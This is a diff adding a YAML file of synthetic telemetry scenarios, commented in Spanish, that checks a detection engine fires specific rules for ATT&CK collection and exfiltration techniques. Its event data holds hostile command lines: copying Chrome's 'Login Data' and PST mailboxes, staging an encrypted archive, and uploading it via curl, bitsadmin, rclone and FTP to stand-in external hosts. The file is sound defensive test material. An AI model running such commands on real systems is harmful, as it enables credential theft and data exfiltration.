@@ -1,0 +1,160 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: Compresion de datos protegida con contrasena (sintetico)
+  id: sim-7z-password-archive
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: compresion de
+    datos protegida con contrasena. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1560.001
+  host: LAB-SIM-7Z-PASSWORD-ARCHIV
+  user: CORP\sim
+  expected:
+  - rule: ae3ac8b8-76bf-4d9e-ba1d-2b2f5568b35e
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4120
+      name: 7za.exe
+      command_line: 7za.exe a -pS3cret! C:\Users\Public\staged.7z C:\Users\sim\Documents
+- name: Captura de pantalla desde PowerShell (sintetico)
+  id: sim-ps-screenshot
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: captura de pantalla
+    desde PowerShell. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1113
+  host: LAB-SIM-PS-SCREENSHOT
+  user: CORP\sim
+  expected:
+  - rule: 0ae5fea0-77bd-42f5-b3ef-fb5c55639bc0
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4121
+      name: powershell.exe
+      command_line: powershell.exe -c Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+- name: Lectura del portapapeles desde la linea de comandos (sintetico)
+  id: sim-ps-clipboard
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: lectura del
+    portapapeles con Get-Clipboard. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1115
+  host: LAB-SIM-PS-CLIPBOARD
+  user: CORP\sim
+  expected:
+  - rule: f0de8115-78c7-4ebd-add3-a1ac994d6a1c
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4122
+      name: powershell.exe
+      command_line: powershell.exe -c Get-Clipboard -Raw
+- name: Acceso a contrasenas y cookies del navegador (sintetico)
+  id: sim-browser-credential-copy
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: acceso a ficheros
+    de contrasenas del navegador. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1555.003
+  host: LAB-SIM-BROWSER-CREDENTIAL
+  user: CORP\sim
+  expected:
+  - rule: 839b58d4-e21c-4184-ad3e-8ec277fa5d46
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4123
+      name: cmd.exe
+      command_line: cmd.exe /c copy "C:\Users\sim\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Users\Public\ld
+- name: Copia de buzones de correo locales (PST/OST) (sintetico)
+  id: sim-pst-mailbox-copy
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: copia de buzones
+    locales PST. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1114.001
+  host: LAB-SIM-PST-MAILBOX-COPY
+  user: CORP\sim
+  expected:
+  - rule: 9f6e6665-e794-4cf6-bdf3-4e7a047b7071
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4124
+      name: robocopy.exe
+      command_line: robocopy.exe C:\Users\sim\Documents C:\Users\Public\mail *.pst
+- name: Exfiltracion con rclone (sintetico)
+  id: sim-rclone-exfil
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: exfiltracion
+    con rclone hacia un remoto. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1567.002
+  host: LAB-SIM-RCLONE-EXFIL
+  user: CORP\sim
+  expected:
+  - rule: deba0967-c92e-4d74-bd95-a8eebdff7d1a
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4125
+      name: rclone.exe
+      command_line: rclone.exe copy C:\Users\sim\Documents remoto:bucket-datos
+- name: Subida de ficheros con curl o PowerShell (sintetico)
+  id: sim-curl-upload
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: subida de ficheros
+    con curl -T. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1048.003
+  host: LAB-SIM-CURL-UPLOAD
+  user: CORP\sim
+  expected:
+  - rule: 53eeff7e-dd36-4321-b468-b2ff0365b223
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4126
+      name: curl.exe
+      command_line: curl.exe -T C:\Users\Public\staged.7z https://203.0.113.12/upload
+- name: Subida de ficheros con bitsadmin (sintetico)
+  id: sim-bitsadmin-upload
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: subida de ficheros
+    con bitsadmin /upload. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1048
+  - t1197
+  host: LAB-SIM-BITSADMIN-UPLOAD
+  user: CORP\sim
+  expected:
+  - rule: 909287cd-287a-4336-8109-a3e946334e61
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4127
+      name: bitsadmin.exe
+      command_line: bitsadmin.exe /transfer job /upload C:\Users\Public\staged.7z https://203.0.113.12/up
+- name: Transferencia FTP con guion de comandos (sintetico)
+  id: sim-ftp-script
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: transferencia
+    FTP con guion de comandos. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1048.003
+  host: LAB-SIM-FTP-SCRIPT
+  user: CORP\sim
+  expected:
+  - rule: 8fb44944-2a7f-4ae6-b8d3-1bd6fcd7490b
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4128
+      name: ftp.exe
+      command_line: ftp.exe -s:C:\Users\Public\ftp.txt 203.0.113.13
